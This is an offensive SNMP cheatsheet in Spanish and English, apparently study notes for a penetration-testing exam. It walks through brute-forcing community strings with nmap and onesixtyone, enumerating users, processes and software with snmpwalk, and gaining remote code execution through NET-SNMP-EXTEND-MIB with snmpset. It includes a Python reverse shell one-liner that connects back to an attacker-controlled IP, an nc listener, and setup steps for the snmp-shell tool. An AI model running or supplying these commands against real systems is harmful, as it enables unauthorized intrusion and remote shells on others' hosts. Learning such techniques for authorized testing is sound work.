## SNMP RCE Cheatsheet

Este documento resume cómo **detectar, enumerar y explotar vulnerabilidades de SNMP** que permiten ejecución remota de comandos a través del módulo **NET‑SNMP‑EXTEND‑MIB**.

---

### 1. Introducción

* **Servicio**: SNMP (Simple Network Management Protocol).
* **Versión afectada**: SNMPv2c con *community string* de escritura (`rwcommunity`).
* **Comportamiento clave**: El MIB `NET‑SNMP‑EXTEND‑MIB` permite registrar comandos que se ejecutan al leerlos (`run-on-read`).

> Si el atacante conoce la comunidad **de lectura** → puede enumerar info sensible.
> Si además conoce la comunidad **de escritura** → puede inyectar comandos y lograr **RCE**.

---

### 2. Enumeración inicial de SNMP

#### 2.1 Nmap 
* Find hosts with SNMP running and output them to a file:
```bash
sudo nmap -sU --open -p 161 <targetRange> -oG open-snmp.txt
```
* Bruteforcing community strings:
```bash
sudo nmap -sU -p 161 --script snmp-brute <ipAddr>
```
* Bruteforcing community strings with custom wordlist:
```bash
sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ipAddr>
```
* Enumerate users on remote machine:
```bash
sudo nmap -sU -p 161 --script snmp-win32-users <ipAddr>
```
* Enumerate services on remote machine:
```bash
sudo nmap -sU -p 161 --script snmp-win32-services <ipAddr>
```
* Run all SNMP-related Nmap Scripts:
```bash
sudo nmap -sU -p 161 --script snmp-* <ipAddr> -oG nmap/snmp.txt
```

#### 2.2 Enumerar con `snmpwalk`

* Enumeración básica con community pública
```bash
snmpwalk -v2c -c public <host>
```
* Enumerar usuarios del sistema
```bash
snmpwalk -v2c -c public <host> 1.3.6.1.4.1.77.1.2.25
```
* Enumerar procesos
```bash
snmpwalk -v2c -c public <host> 1.3.6.1.2.1.25.4.2.1.2
```
* Enumerar software instalado
```bash
snmpwalk -v2c -c public <host> 1.3.6.1.2.1.25.6.3.1.2
```
* Enumerate SNMPv1 with a community string of “public” AND limit timeouts to 10 seconds:
```bash
snmpwalk -c public -v1 -t 10 <ipAddr>
```
* Enumerate SNMPv1 with a community string of “public” AND automatically translate any hexadecimal string into ASCII that was otherwise not decoded
```bash
snmpwalk -c public -v1 -Oa <ipAddr>
```
* Enumerate SNMPv2 with a community string of “public”:
```bash
snmpwalk -v2c -c public <ipAddr>
```
* Enumerate SNMPv2 with a community string of “public”AND search for installed software:
```bash
snmpwalk -v2c -c public <ipAddr> hrSWInstalledName
```
* Enumerate SNMPv2 with a community string of “public”AND search amount of RAM on the host:
```bash
snmpwalk -v2c -c public <ipAddr> hrMemorySize
```

#### 2.3 Identificar strings de comunidad

* Intentar con: `public`, `private`, `manager`.
* Herramienta útil:

* Fuerza bruta de comunidades con onesixtyone
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```
---

```bash
onesixtyone -c dict.txt <host>
```

Si --> `rwcommunity`, avanzar a RCE.

---

### 3. Explotación: SNMP RCE con `NET‑SNMP‑EXTEND‑MIB`

#### 3.1 Crear un comando remoto con `snmpset`

```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <rwcommunity> <host> \
 'nsExtendStatus."testcmd"' = createAndGo \
 'nsExtendCommand."testcmd"' = /bin/echo \
 'nsExtendArgs."testcmd"' = 'hola mundo'
```

* `nsExtendStatus` → crea la entrada.
* `nsExtendCommand` → comando a ejecutar.
* `nsExtendArgs` → argumentos.

#### 3.2 Ejecutar y verificar

```bash
snmpwalk -v2c -c <rwcommunity> <host> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

Esto dispara la ejecución y muestra la salida.

#### 3.3 Reverse shell manual

* Ejemplo con Python:

```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <rwcommunity> <host> \
 'nsExtendStatus."shell"' = createAndGo \
 'nsExtendCommand."shell"' = /usr/bin/python3 \
 'nsExtendArgs."shell"' = '-c "import socket,os,pty;s=socket.socket();s.connect((\"<mi_IP>\",<mi_puerto>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
* Dispara la ejecución
```bash
snmpwalk -v2c -c <rwcommunity> <host> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

* Receptor:

```bash
nc -lvnp <puerto>
```
---

### 4. Explotación automática con snmp-shell

#### 4.1 Instalación

```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell.git
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```

#### 4.2 Uso

```bash
python3 snmp-shell.py -t <host> -c <rwcommunity>
```

Obtendrás una shell interactiva vía SNMP.

---

### 5. Cheatsheet Resumido

| Etapa | Acción                      | Comando                                                                                         |
| ----- | --------------------------- | ----------------------------------------------------------------------------------------------- |
| 1     | Descubrir puerto UDP SNMP   | `nmap -sU -p 161 <host>`                                                                        |
| 2     | Enumerar info SNMP          | `snmpwalk -v2c -c public <host>`                                                                |
| 3     | Descubrir community strings | `onesixtyone -c dict.txt <host>`                                                                |
| 4     | Crear comando remoto        | `snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c rwcomm <host> 'nsExtendStatus."test"'=createAndGo ...` |
| 5     | Ejecutar comando            | `snmpwalk -v2c -c rwcomm <host> NET-SNMP-EXTEND-MIB::nsExtendObjects`                           |
| 6     | Reverse shell               | Inyectar comando con Python + ejecutar `snmpwalk`                                               |
| 7     | Exploitar con snmp-shell    | `python3 snmp-shell.py -t <host> -c rwcomm`                                                     |

---

### 6. Tabla OIDs

| OID | Descripcion |
|-----|-------------| 
| 1.3.6.1.2.1.1 | Informacion general |
| 1.3.6.1.4.1.77.1.2.25 | Usuarios | 
| 1.3.6.1.4.1.77.1.2.3 | Recursos Compartidos |
| 1.3.6.1.2.1.25.2.3.1.4 | Unidades de almacenamiento |
| 1.3.6.1.2.1.25.4.2.1.2 | Programas en ejecucion | 
| 1.3.6.1.2.1.25.1.6.0 | Procesos del sistema |
| 1.3.6.1.2.1.25.4.2.1.4 | Process path |
| 1.3.6.1.2.1.25.6.3.1.2 | Software instalado |
| 1.3.6.1.2.1.4.20.1.1 | IPs configuradas | 
| 1.3.6.1.4.1 | String texto plano |
| 1.3.6.1.2.1.6.13.1.3 | Puertos TCP |


✅ **Checklist en examen**:

1. ¿Puerto 161 abierto? → Enumerar.
2. ¿Community de lectura? → Extraer información.
3. ¿Community de escritura? → Intentar RCE con `snmpset`.
4. ¿Necesito shell? → Payload Python + `snmpwalk`.
5. Automatizar si es posible con `snmp-shell`.
